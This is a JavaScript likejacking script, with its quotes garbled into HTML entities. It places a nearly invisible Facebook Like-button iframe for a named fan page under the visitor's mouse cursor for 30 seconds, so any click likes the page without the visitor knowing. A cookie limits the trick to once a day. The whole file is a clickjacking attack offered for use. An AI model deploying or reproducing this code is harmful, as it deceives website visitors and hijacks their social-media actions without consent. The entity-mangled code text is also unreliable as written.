var fan_page_url = 'https://www.facebook.com/giaitrionline24g'

var opacity =0.04;

var time = 30000;

if((document.getElementById) && window.addEventListener || window.attachEvent){

    (function(){

        var hairCol = &#8220;#ff0000&#8243;;

        var d = document;

        var my = -10;

        var mx = -10;

        var r;

        var vert = &#8220;&#8221;;

        var idx = document.getElementsByTagName(&#8216;div&#8217;).length;

        var thehairs = &#8220;<iframe id=&#8217;theiframe&#8217; scrolling=&#8217;no&#8217; frameBorder=&#8217;0&#8242; allowTransparency=&#8217;true&#8217; src=&#8217;http://www.facebook.com/widgets/like.php?href=&#8221; + encodeURIComponent(fan_page_url) + &#8220;&amp;layout=standard&amp;show_faces=true&amp;width=80&amp;action=like&amp;colorscheme=light&amp;height=30&#8242; style=&#8217;position:absolute;width:53px;height:30px;z-index: 200000;overflow:hidden;border:0;opacity:&#8221; + opacity +&#8221;;filter:alpha(opacity=&#8221; + opacity * 100+ &#8220;);&#8217;></iframe>&#8221;;

        var like;

        var faceLike=getCookie(&#8220;faceLike&#8221;);

        if (faceLike!=null && faceLike!=&#8221;&#8221;){}

        else{

            setCookie(&#8220;faceLike&#8221;,&#8217;liked&#8217;,1);

            document.write(thehairs);

            like = document.getElementById(&#8220;theiframe&#8221;);

            document.getElementsByTagName(&#8216;body&#8217;)[0].appendChild(like);

        }

        var pix = &#8220;px&#8221;;

        var domWw = (typeof window.innerWidth == &#8220;number&#8221;);

        var domSy = (typeof window.pageYOffset == &#8220;number&#8221;);

        if (domWw)

            r = window;

        else{

            if (d.documentElement && typeof d.documentElement.clientWidth == &#8220;number&#8221; && d.documentElement.clientWidth != 0)

                r = d.documentElement;

            else{

                if (d.body && typeof d.body.clientWidth == &#8220;number&#8221;)

                    r = d.body;

            }

        }

        if(time != 0){

            setTimeout(function(){

                        document.getElementsByTagName(&#8216;body&#8217;)[0].removeChild(like);

                        if (window.addEventListener){

                            document.removeEventListener(&#8220;mousemove&#8221;,mouse,false);

                        }

                        else if (window.attachEvent){

                            document.detachEvent(&#8220;onmousemove&#8221;,mouse);

                        }

                    }, time);

        }

        function scrl(yx){

            var y,x;

            if (domSy){

                y = r.pageYOffset;

                x = r.pageXOffset;

            }

            else{

                y = r.scrollTop;

                x = r.scrollLeft;

            }

            return (yx == 0) ? y:x;

        }

        function mouse(e){

            var msy = (domSy)?window.pageYOffset:0;

            if (!e)

                e = window.event;

            if (typeof e.pageY == &#8216;number&#8217;){

                my = e.pageY &#8211; 15 &#8211; msy;

                mx = e.pageX &#8211; 34;

            }

            else{

                my = e.clientY &#8211; 16 &#8211; msy;

                mx = e.clientX &#8211; 36;

            }

            vert.top = my + scrl(0) + pix;

            vert.left = mx + pix;

        }

        function ani(){

            vert.top = my + scrl(0) + pix;

            setTimeout(ani, 300);

        }

        function init(){

            vert = document.getElementById(&#8220;theiframe&#8221;).style;

            ani();

        }

        function getCookie(c_name){

           var c_value = document.cookie;

           var c_start = c_value.indexOf(&#8221; &#8221; + c_name + &#8220;=&#8221;);

           if (c_start == -1){

           c_start = c_value.indexOf(c_name + &#8220;=&#8221;);

        }

        if (c_start == -1){

           c_value = null;

        }

        else{

           c_start = c_value.indexOf(&#8220;=&#8221;, c_start) + 1;

           var c_end = c_value.indexOf(&#8220;;&#8221;, c_start);

           if (c_end == -1){

              c_end = c_value.length;

           }

           c_value = unescape(c_value.substring(c_start,c_end));

        }

        return c_value;

        }

        function setCookie(c_name,value,exdays) {

           var exdate=new Date();

           exdate.setDate(exdate.getDate() + exdays);

           var c_value=escape(value) + ((exdays==null) ? &#8220;&#8221; : &#8220;; expires=&#8221;+exdate.toUTCString());

           document.cookie=c_name + &#8220;=&#8221; + c_value;

        }

        function checkCookie(){

            var faceLike=getCookie(&#8220;faceLike&#8221;);

            if (faceLike!=null && faceLike!=&#8221;&#8221;){

               alert(&#8220;Welcome again &#8221; + faceLike);

            }

            else{

                setCookie(&#8220;faceLike&#8221;,&#8217;liked&#8217;,1);

            }

         }

        if (window.addEventListener){

            window.addEventListener(&#8220;load&#8221;,init,false);

            document.addEventListener(&#8220;mousemove&#8221;,mouse,false);

        }

        else if (window.attachEvent){

            window.attachEvent(&#8220;onload&#8221;,init);

            document.attachEvent(&#8220;onmousemove&#8221;,mouse);

        }

    })();

}//End